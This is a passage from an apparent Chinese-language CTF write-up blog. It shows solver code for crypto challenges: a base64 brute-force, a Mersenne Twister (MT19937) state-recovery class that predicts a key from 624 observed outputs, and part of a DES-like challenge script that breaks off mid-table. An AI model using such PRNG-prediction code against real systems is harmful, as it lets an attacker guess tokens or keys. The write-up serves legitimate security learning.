class="string">"Z"</span>+i+j+<span class="string">"h"</span>)</span><br><span class="line">            FLAG = FLAG.<span class="keyword">replace</span>(<span class="string">"N!0x"</span>,<span class="string">"N"</span>+i+<span class="string">"0x"</span>).<span class="keyword">replace</span>(<span class="string">"Z!!h"</span>,<span class="string">"Z"</span>+i+j+<span class="string">"h"</span>)</span><br><span class="line">            <span class="keyword">table</span> = <span class="keyword">table</span>.<span class="keyword">replace</span>(i,<span class="string">""</span>).<span class="keyword">replace</span>(j,<span class="string">""</span>)</span><br><span class="line">            #<span class="keyword">print</span> i,<span class="built_in">j</span></span><br><span class="line">            #<span class="keyword">print</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="string">"for X and E"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">table</span>:</span><br><span class="line">        <span class="keyword">if</span> j == i:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        s = b64decode(FLAG.<span class="keyword">replace</span>(<span class="string">"Mm!l"</span>,<span class="string">"Mm"</span>+i+<span class="string">"l"</span>).<span class="keyword">replace</span>(<span class="string">"LT!m"</span>,<span class="string">"LT"</span>+i+<span class="string">"m"</span>).<span class="keyword">replace</span>(<span class="string">"YW!k"</span>,<span class="string">"YW"</span>+j+'k'))</span><br><span class="line">        <span class="keyword">if</span> check(s):</span><br><span class="line">            <span class="keyword">print</span> <span class="built_in">s</span></span><br></pre></td></tr></table></figure><h2 id="rand"><a href="#rand" class="headerlink" title="rand"></a>rand</h2><p>啊，一道憨憨题，mt19937都快给玩烂了。而且这还是最最简单的预测，直接套上现成的工具就能解key。至于后面的一个只给了加密函数没给解密函数用的feistel的密码，可能是DES吧，没细看。直接把密钥流反过来，用他给的加密函数来解密就好了。</p><p>MT19937预测key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MT19937Recover</span>:</span></span><br><span class="line">    <span class="string">"""Reverses the Mersenne Twister based on 624 observed outputs.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The internal state of a Mersenne Twister can be recovered by observing</span></span><br><span class="line"><span class="string">    624 generated outputs of it. However, if those are not directly</span></span><br><span class="line"><span class="string">    observed following a twist, another output is required to restore the</span></span><br><span class="line"><span class="string">    internal index.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    See also https://en.wikipedia.org/wiki/Mersenne_Twister#Pseudocode .</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftRight</span><span class="params">(self, x, shift)</span>:</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            res = x ^ res &gt;&gt; shift</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">unshiftLeft</span><span class="params">(self, x, shift, mask)</span>:</span></span><br><span class="line">        res = x</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">            res = x ^ (res &lt;&lt; shift &amp; mask)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">untemper</span><span class="params">(self, v)</span>:</span></span><br><span class="line">        <span class="string">""" Reverses the tempering which is applied to outputs of MT19937 """</span></span><br><span class="line"></span><br><span class="line">        v = self.unshiftRight(v, <span class="number">18</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">        v = self.unshiftLeft(v, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">        v = self.unshiftRight(v, <span class="number">11</span>)</span><br><span class="line">        <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(self, outputs, forward=True)</span>:</span></span><br><span class="line">        <span class="string">"""Reverses the Mersenne Twister based on 624 observed values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            outputs (List[int]): list of &gt;= 624 observed outputs from the PRNG.</span></span><br><span class="line"><span class="string">                However, &gt;= 625 outputs are required to correctly recover</span></span><br><span class="line"><span class="string">                the internal index.</span></span><br><span class="line"><span class="string">            forward (bool): Forward internal state until all observed outputs</span></span><br><span class="line"><span class="string">                are generated.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Returns a random.Random() object.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        result_state = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> len(outputs) &gt;= <span class="number">624</span>       <span class="comment"># need at least 624 values</span></span><br><span class="line"></span><br><span class="line">        ivals = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            ivals.append(self.untemper(outputs[i]))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(outputs) &gt;= <span class="number">625</span>:</span><br><span class="line">            <span class="comment"># We have additional outputs and can correctly</span></span><br><span class="line">            <span class="comment"># recover the internal index by bruteforce</span></span><br><span class="line">            challenge = outputs[<span class="number">624</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">626</span>):</span><br><span class="line">                state = (<span class="number">3</span>, tuple(ivals+[i]), <span class="literal">None</span>)</span><br><span class="line">                r = random.Random()</span><br><span class="line">                r.setstate(state)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> challenge == r.getrandbits(<span class="number">32</span>):</span><br><span class="line">                    result_state = state</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># With only 624 outputs we assume they were the first observed 624</span></span><br><span class="line">            <span class="comment"># outputs after a twist --&gt;  we set the internal index to 624.</span></span><br><span class="line">            result_state = (<span class="number">3</span>, tuple(ivals+[<span class="number">624</span>]), <span class="literal">None</span>)</span><br><span class="line">        rand = random.Random()</span><br><span class="line">        rand.setstate(result_state)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> forward:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>, len(outputs)):</span><br><span class="line">                <span class="keyword">assert</span> rand.getrandbits(<span class="number">32</span>) == outputs[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rand</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_PythonMT19937Recover</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""Just a testcase to ensure correctness"""</span></span><br><span class="line">    mtb = MT19937Recover()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#r1 = random.Random(0x31337)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># just some discarded random numbers to move internal state forward</span></span><br><span class="line">    <span class="comment">#[r1.getrandbits(32) for _ in range(1234)]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the actual leak of 1000 values</span></span><br><span class="line">    <span class="comment">#n = [r1.getrandbits(32) for _ in range(1000)]</span></span><br><span class="line">    <span class="keyword">with</span> open (<span class="string">"random"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        nn= f.read().split(<span class="string">"\n"</span>)</span><br><span class="line">        print(nn)</span><br><span class="line">        n = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> nn[:<span class="number">-1</span>]]</span><br><span class="line">    r2 = mtb.go(n)</span><br><span class="line">    <span class="keyword">print</span> (r2.getrandbits(<span class="number">32</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#assert r1.getrandbits(32) == r2.getrandbits(32)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test_PythonMT19937Recover()</span><br></pre></td></tr></table></figure><p>拿到key，改加密函数，解密得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"flag&#123;************************************&#125;"</span></span><br><span class="line"></span><br><span class="line">hexadecimalcontrast = &#123;</span><br><span class="line">    <span class="string">'0'</span>: <span class="string">'0000'</span>,</span><br><span class="line">    <span class="string">'1'</span>: <span class="string">'0001'</span>,</span><br><span class="line">    <span class="string">'2'</span>: <span class="string">'0010'</span>,</span><br><span class="line">    <span class="string">'3'</span>: <span class="string">'0011'</span>,</span><br><span class="line">    <span class="string">'4'</span>: <span class="string">'0100'</span>,</span><br><span class="line">    <span class="string">'5'</span>: <span class="string">'0101'</span>,</span><br><span class="line">    <span class="string">'6'</span>: <span class="string">'0110'</span>,</span><br><span class="line">    <span class="string">'7'</span>: <span class="string">'0111'</span>,</span><br><span class="line">    <span class="string">'8'</span>: <span class="string">'1000'</span>,</span><br><span class="line">    <span class="string">'9'</span>: <span class="string">'1001'</span>,</span><br><span class="line">    <span class="string">'a'</span>: <span class="string">'1010'</span>,</span><br><span class="line">    <span class="string">'b'</span>: <span class="string">'1011'</span>,</span><br><span class="line">    <span class="string">'c'</span>: <span class="string">'1100'</span>,</span><br><span class="line">    <span class="string">'d'</span>: <span class="string">'1101'</span>,</span><br><span class="line">    <span class="string">'e'</span>: <span class="string">'1110'</span>,</span><br><span class="line">    <span class="string">'f'</span>: <span class="string">'1111'</span>,</span><br><span class="line">&#125;</span><br><span class="line">IP = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">      <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">      <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">      <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">      <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line">IP_1 = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line">        <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">        <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line">        <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">        <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">        <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line">        <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line">E = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">     <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">     <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">     <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">     <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">     <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">     <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">     <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line">S = [[<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>,</span><br><span class="line">      <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>, ],</span><br><span class="line">     [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>, ],</span><br><span class="line">     [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>,</span><br><span class="line">      <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>,</span><br><span class="line">      <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>, ],</span><br><span class="line">     [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">      <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>,</span><br><span class="line">      <span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>, ],</span><br><span class="line">     [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>,</span><br><span class="line">      <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">      <span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>, ],</span><br><span class="line">     [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span 